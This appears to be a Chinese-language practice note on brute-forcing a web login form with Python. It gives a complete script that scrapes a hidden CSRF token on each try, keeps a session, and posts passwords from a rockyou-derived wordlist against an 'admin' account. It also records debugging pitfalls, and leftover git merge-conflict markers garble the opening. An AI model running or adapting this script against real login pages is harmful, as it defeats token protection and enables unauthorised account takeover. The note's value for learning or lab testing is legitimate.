# 1.python request模块进行破解

1. 今日份目标：暴力破解成功

2. 流程：使用python进行任务


<<<<<<< HEAD

## 2.步骤如下

> > > > 1. 用request模块请求url
=======
>>>>>>> a20a7accc9b00a85b6c1db3456b0597ebf94719b

# 2.步骤如下

1. 用request模块请求url
2. 对于返回包进行切片操作，获取其中的token值
3. 将获取到的token值与字典一起发送进行暴力破解





# 3.步骤开始

[参考网址](<http://docs.python-requests.org/zh_CN/latest/user/quickstart.html>)

[参考网址1：用来request的用法](<https://blog.csdn.net/LOLITA0164/article/details/80176996>)

[参考网址2：最终实现方法](<https://blog.csdn.net/Danielntz/article/details/51861168>)

[参考网址3:获取token](eed1183184514fde0ef6310575f14458)

## 3.1Token获取代码如下：

```txt
import urllib
import re
from bs4 import BeautifulSoup
from distutils.filelist import findall

host = "http://打码用***打码用/c/hdyzma/"

page = urllib.request.urlopen(host)
contents = page.read()

soup = BeautifulSoup(contents,"html.parser")
#soup的用法

print(soup.find('input',style='display:none')['value'])
#这里用法 是  find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值

```

## 3.2 字典取list

[参考网址1：编码问题](<https://www.cnblogs.com/mengyu/p/6638975.html>)



---

坑点二：文件操作问题 [参考网址](<https://www.cnblogs.com/zarr12steven/p/6206600.html>)

遇到的情况：

Traceback (most recent call last):
  File "03_crake.py", line 5, in <module>
    get = f.readline()
io.UnsupportedOperation: not readable

解决方法：open函数里 'a' 改为'r'

---

---

坑点三：rockyou.txt出现编码问题

原因：rockyou文本太大，里面有一下密码会导致编码出错无法读取之类的

解决办法：新建一个simple文本，填入大概100个密码

---

---

坑点四：发包之后显示token错误

原因：发的包里没有sessionid

解决办法：加进去

解决代码：`s = requests.session()`

​			`s.get   s.post`

---

## 3.3 循环

`for get in gets`





# 4. 完成！

最后代码如下：

```txt

import urllib
import re
from bs4 import BeautifulSoup
from distutils.filelist import findall

import requests

gets = open("C:/Users/Elliot/Desktop/python_req_crack/simple.txt","r").read().splitlines()

host = "http://打码用***打码用/c/hdyzma/"

s = requests.session()


for get in gets:
    contents = s.get(host,proxies={'http': 'http://127.0.0.1:8080'}).content
    soup = BeautifulSoup(contents, "html.parser")
# soup的用法
    token = soup.find('input', style='display:none')['value']

    #print(token)


#for line in f.readlines():

    print(get)
   # print(line)

#这里用法 是  find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值


    url = host+'welcome.php'
    d = {'name': 'admin','password':get,'token':token }
    r = s.post(url, data=d,proxies={'http': 'http://127.0.0.1:8080'})
    r.encoding = 'UTF-8'
    print(r.text)
```



